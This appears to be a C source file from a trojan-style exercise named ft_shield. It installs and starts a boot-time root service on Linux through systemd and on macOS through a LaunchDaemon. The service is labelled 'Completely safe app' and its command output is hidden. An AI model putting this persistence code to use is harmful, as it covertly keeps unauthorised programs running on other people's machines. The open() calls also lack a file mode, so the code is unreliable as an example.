#include <sys/wait.h>
#include <sys/stat.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <stdlib.h>
#include <errno.h>

#include "util.h"

int check_service_linux()
{
	int status = system("systemctl list-unit-files ft_shield.service > /dev/null 2>&1");
    
    if (WIFEXITED(status)) {
        int return_code = WEXITSTATUS(status);
        return return_code;
    }
	printf("check_service_linux: Error running systemctl\n");
	return -1;
}

int check_running_linux()
{
	int status = system("systemctl is-active --quiet ft_shield");
    
    if (WIFEXITED(status)) {
        int return_code = WEXITSTATUS(status);
        return return_code;
    }
	printf("check_running_linux: Error running systemctl\n");
	return -1;

}

int create_service_linux()
{
    unsigned int buffer_size = 1024;
	unsigned int written = 0;
    char *path = "/etc/systemd/system/ft_shield.service";
	int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC);
	if (fd < 0)
	{
		printf("create_service_apple: failed to create new file: %d\n", errno);
		return 1;
	}

    char file_contents[1024];

    // sprintf(file_contents, """
    // [Unit]
    // Description=Completely safe app (ft_shield)

    // [Service]
    // Type=simple
    // ExecStart=%s
    // StandardOutput=journal
    // StandardError=journal

    // [Install]
    // WantedBy=multi-user.target
    
    // """, DEST_PATH);

    sprintf(file_contents,
    "[Unit]\n"
    "Description=Completely safe app (ft_shield)\n"
    "\n"
    "[Service]\n"
    "Type=simple\n"
    "ExecStart=%s\n"
    "StandardOutput=journal\n"
    "StandardError=journal\n"
    "\n"
    "[Install]\n"
    "WantedBy=multi-user.target\n",
    DEST_PATH);


    while (written < strlen(file_contents))
    {
        int n = write(fd,
                      file_contents + written,
                      (strlen(file_contents) - written > buffer_size)
                          ? buffer_size
                          : (strlen(file_contents) - written));

        if (n <= 0)
        {
            perror("create_service_linux: write failed");
            close(fd);
            return 1;
        }

        written += n;
    }

    close(fd);
    return 0;   
}

int start_service_linux()
{
    int status = system("systemctl daemon-reload; systemctl enable --quiet --now ft_shield > /dev/null 2>&1");
    
    if (WIFEXITED(status)) {
        int return_code = WEXITSTATUS(status);
        return return_code;
    }
	printf("check_service_linux: Error running systemctl\n");
	return -1;
}

int check_service_apple()
{
	int status = system("launchctl list | grep ft_shield > /dev/null 2>&1");
    
    if (WIFEXITED(status)) {
        int return_code = WEXITSTATUS(status);
        return return_code;
    }
	printf("check_service_apple: Error running launchctl\n");
	return -1;
}

int check_running_apple()
{
	int status = system("pgrep -x ft_shield > /dev/null 2>&1");
    
    if (WIFEXITED(status)) {
        int return_code = WEXITSTATUS(status);
        return return_code;
    }
	printf("check_running_apple: Error running pgrep\n");
	return -1;
}

int create_service_apple()
{
    unsigned int buffer_size = 1024;
	unsigned int written = 0;
    char *path = "/Library/LaunchDaemons/com.ft_shield.plist";
	int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC);
	if (fd < 0)
	{
		printf("create_service_apple: failed to create new file: %d\n", errno);
		return 1;
	}

    char file_contents[1024];

    sprintf(file_contents,
        "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
        "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n"
        "<plist version=\"1.0\">\n"
        "<dict>\n"
        "    <key>Label</key>\n"
        "    <string>com.ft_shield</string>\n"
        "\n"
        "    <key>ProgramArguments</key>\n"
        "    <array>\n"
        "        <string>%s</string>\n"
        "    </array>\n"
        "\n"
        "    <key>RunAtLoad</key>\n"
        "    <true/>\n"
        "\n"
        "    <key>StandardOutPath</key>\n"
        "    <string>/var/log/ft_shield.log</string>\n"
        "    <key>StandardErrorPath</key>\n"
        "    <string>/var/log/ft_shield.err</string>\n"
        "</dict>\n"
        "</plist>\n",
        DEST_PATH);

    while (written < strlen(file_contents))
    {
        int n = write(fd,
                      file_contents + written,
                      (strlen(file_contents) - written > buffer_size)
                          ? buffer_size
                          : (strlen(file_contents) - written));

        if (n <= 0)
        {
            perror("create_service_apple: write failed");
            close(fd);
            return 1;
        }

        written += n;
    }

    // needed for macOS
    fchmod(fd, 0644);
    close(fd);

    // create log files
    path = "/var/log/ft_shield.log";
    fd = open(path, O_WRONLY | O_CREAT | O_TRUNC);
	if (fd < 0)
	{
		printf("create_service_apple: failed to create new log file: %d\n", errno);
		return 1;
	}
    fchmod(fd, 0644);
    close(fd);

    path = "/var/log/ft_shield.err";
    fd = open(path, O_WRONLY | O_CREAT | O_TRUNC);
	if (fd < 0)
	{
		printf("create_service_apple: failed to create new log file: %d\n", errno);
		return 1;
	}
    fchmod(fd, 0644);
    close(fd);


    return 0;   
}

int start_service_apple()
{
    int status = system("launchctl load /Library/LaunchDaemons/com.ft_shield.plist > /dev/null 2>&1");
    
    if (WIFEXITED(status)) {
        int return_code = WEXITSTATUS(status);
        return return_code;
    }
    printf("start_service_apple: Error running launchctl\n");
    return -1;       
}